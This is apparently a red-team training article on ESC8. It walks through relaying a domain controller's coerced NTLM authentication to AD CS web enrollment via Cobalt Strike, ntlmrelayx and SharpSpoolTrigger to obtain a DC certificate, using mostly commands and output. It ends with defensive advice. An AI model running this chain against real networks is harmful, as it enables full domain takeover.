---
title: "NTLM Relay to AD CS HTTP Endpoints (ESC8)"
date: 2026-09-25
weight: 6
type: docs
tags:
  - AD CS
  - ESC8
  - NTLM Relay
  - Coercion
  - Active Directory
---

## What ESC8 is

A certificate authority can optionally run web enrollment services, delivered through IIS, that let users request certificates from a browser. When those endpoints are not served over HTTPS with channel binding enforced, they are exposed to NTLM relaying. An attacker who can capture and relay NTLM authentication to the web service can enrol for certificates in the name of the relayed principal. The endpoint usually lives at `http[s]://<ca>/certsrv/`.

Certify's `enum-cas` command returns the URL and reports whether the CA is vulnerable to ESC8:

```powershell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

    Enterprise CA Name            : ARCADIA Root CA
    DNS Hostname                  : hq-ca-01.arcadia.local
    FullName                      : hq-ca-01.arcadia.local\ARCADIA Root CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ARCADIA Root CA, DC=arcadia, DC=local
    Cert Thumbprint               : 73B4B551DB60427D0CBD5D2E2658BCB2088F3F2C
    Cert Serial                   : 11138CE7C4FC0C9B4F805AC184522B2C
    Cert Start Date               : 30/08/2025 12:19:40
    Cert End Date                 : 30/08/2125 12:29:39
    Cert Chain                    : CN=ARCADIARootCA,DC=arcadia,DC=local
    User Specifies SAN            : Disabled
    RPC Request Encryption        : Enabled
    Vulnerabilities
      ESC8                        : The CA supports HTTP web enrollment without channel binding.
    CA Permissions
      Owner: BUILTIN\Administrators             S-1-5-32-544
      
    Legacy ASP Enrollment Website : http://hq-ca-01.arcadia.local/certsrv/
```

## Relaying from a C2

Relaying through a C2 is considerably more involved than sitting on the local LAN with a Kali VM. On Windows we do not have easy control over port 445, because it is already bound, and neither Windows nor Beacon has a native way to run the usual relaying tools such as ntlmrelayx. Bridging that gap takes four moving parts:

- Unbind port 445 on a compromised machine.
- Start a reverse port forward on port 445 to tunnel inbound NTLM authentication down to the attacker machine.
- Run ntlmrelayx on the attacker machine to receive the authentication from the reverse port forward.
- Run a SOCKS proxy so ntlmrelayx can forward the relayed requests back up to the AD CS HTTP endpoint.

### Freeing port 445

As [Nick Powers](https://x.com/zyn3rgy) established, port 445 is held by the `srvnet.sys` driver, run by a service of the same name. It cannot simply be stopped, because other services depend on it, so the services have to be stopped in order: *lanmanserver*, then *srv2*, then *srvnet*.

First, confirm with the **netstat** BOF that port 445 is currently bound, noting that PID 4 is the system/kernel process:

```powershell
beacon> netstat

PROTO   SRC            DST       STATE        PROCESS    PID
TCP     0.0.0.0:445    LISTEN    LISTENING               (    4)
```

*lanmanserver* is set to **AUTO_START** and will restart itself given the chance, whereas *srv2* and *srvnet* are **DEMAND_START**. So the first move is to reconfigure *lanmanserver* temporarily so it cannot start again:

```powershell
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
config_service:
  hostname:    
  servicename: lanmanserver
  binpath:     C:\Windows\system32\svchost.exe -k netsvcs -p
  ignoremode:  1
  startmode:   4
SUCCESS.
```

Then stop each service in turn:

```powershell
beacon> sc_stop lanmanserver
stop_service:
  hostname:    
  servicename: lanmanserver
SUCCESS.

beacon> sc_stop srv2
stop_service:
  hostname:    
  servicename: srv2
SUCCESS.

beacon> sc_stop srvnet
stop_service:
  hostname:    
  servicename: srvnet
SUCCESS.
```

Running **netstat** once more should show port 445 no longer listening.

One significant caveat: unbinding port 445 breaks every SMB-dependent service on the host, including file shares and SMB Beacons. Do not do this on a machine where those services matter.

### Tunnelling the authentication

With 445 free, set up the reverse port forward. Beacon offers two commands for this:

- **rportfwd** binds the port on the target and forwards data to the destination via the team server.
- **rportfwd_local** binds the port on the target and forwards data to the destination via the Cobalt Strike client.

Here ntlmrelayx runs inside a Docker container on the attacker workstation, with port 7445 on the host mapped to 445 inside the container. So **rportfwd_local** is used to forward to the local loopback on port 7445:

```powershell
beacon> rportfwd_local 445 localhost 7445
[+] started reverse port forward on 445 to neo -> localhost:7445
```

**netstat** now shows 445 listening again, but under the Beacon's PID rather than the kernel:

```powershell
beacon> netstat

PROTO   SRC            DST       STATE        PROCESS                            PID
TCP     0.0.0.0:445    LISTEN    LISTENING    C:\Windows\System32\svchost.exe    ( 3452)
```

If the Beacon is on a desktop rather than a server, consider whether inbound 445 is permitted by the Windows firewall, and add a temporary allow rule if not.

Next, start a SOCKS proxy for ntlmrelayx to use:

```powershell
beacon> socks 1080 socks5
[+] started SOCKS5 server on: 1080
```

### Running ntlmrelayx

The final piece of setup is ntlmrelayx itself, running inside the Kali Docker container and targeting the CA's web enrollment endpoint. The `--template DomainController` option is chosen deliberately, for reasons that become clear in the next step:

```powershell
PS C:\Users\Attacker> docker container start -i kali-1
┌──(root㉿fe0bcf4000ca)-[/]
└─# proxychains impacket-ntlmrelayx -t http://172.16.40.15/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

## Coercing and capturing the certificate

To generate the authentication to relay, reuse the coercion technique covered in the earlier S4U2self article, this time to relay the credentials of a domain controller. That is exactly why a *DomainController* certificate is requested. With ntlmrelayx waiting, return to Beacon and run SharpSpoolTrigger, pointing the DC at the compromised relay host:

```powershell
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 172.16.40.10 172.16.41.108
```

When the coerced authentication is tunnelled down to ntlmrelayx, it relays the request up through the SOCKS proxy to the web endpoint, requests the certificate, and saves the issued certificate in PFX form:

```powershell
[*] (SMB): Received connection from 172.17.0.1, attacking target http://172.16.40.15
|S-chain|-<>-10.0.0.5:1080-<><>-172.16.40.15:80-<><>-OK
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from ARCADIA/HQ-DC-02$@172.17.0.1 against http://172.16.40.15 SUCCEED [1]
[*] (SMB): Received connection from 172.17.0.1, attacking target http://172.16.40.15
|S-chain|-<>-10.0.0.5:1080-<><>-172.16.40.15:80-<><>-OK
[*] http://ARCADIA/HQ-DC-02$@172.16.40.15 [1] -> Generating CSR...
[*] http://ARCADIA/HQ-DC-02$@172.16.40.15 [1] -> CSR generated!
[*] http://ARCADIA/HQ-DC-02$@172.16.40.15 [1] -> Getting certificate...
[*] All targets processed!
[*] (SMB): Connection from 172.17.0.1 controlled, but there are no more targets left!
[*] http://ARCADIA/HQ-DC-02$@172.16.40.15 [1] -> GOT CERTIFICATE! ID 3
[*] http://ARCADIA/HQ-DC-02$@172.16.40.15 [1] -> Writing PKCS#12 certificate to ./HQ-DC-02.pfx
[*] http://ARCADIA/HQ-DC-02$@172.16.40.15 [1] -> Certificate successfully written to file
```

That certificate can be used to obtain a TGT for the domain controller, and from there S4U2self yields usable service tickets for domain administrators.

## Defensive considerations

ESC8 is really an NTLM-relay problem exposed through the CA's web enrollment, so the fixes target both. On the CA, disable HTTP web enrollment entirely where it is not needed, and where web enrollment is required, serve it only over HTTPS with Extended Protection for Authentication (channel binding) enforced in IIS, which is what defeats the relay. Enabling the `SUPPORTS_NT_AUTHENTICATION` requirement to also demand signing, and requiring EPA on the CA, closes the gap Certify is reporting. More broadly, reducing NTLM usage across the estate and enabling SMB signing limits relaying opportunities generally, and cutting off coercion vectors such as the Print Spooler and MS-EFSRPC removes the trigger that drives this specific chain. For detection, a domain controller machine account authenticating to a CA's web enrollment endpoint is highly abnormal and makes a strong alert.

## Further reading

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Nick Powers on unbinding port 445 for relaying](https://x.com/zyn3rgy)
- [GhostPack Certify](https://github.com/GhostPack/Certify)
- [Impacket](https://github.com/fortra/impacket)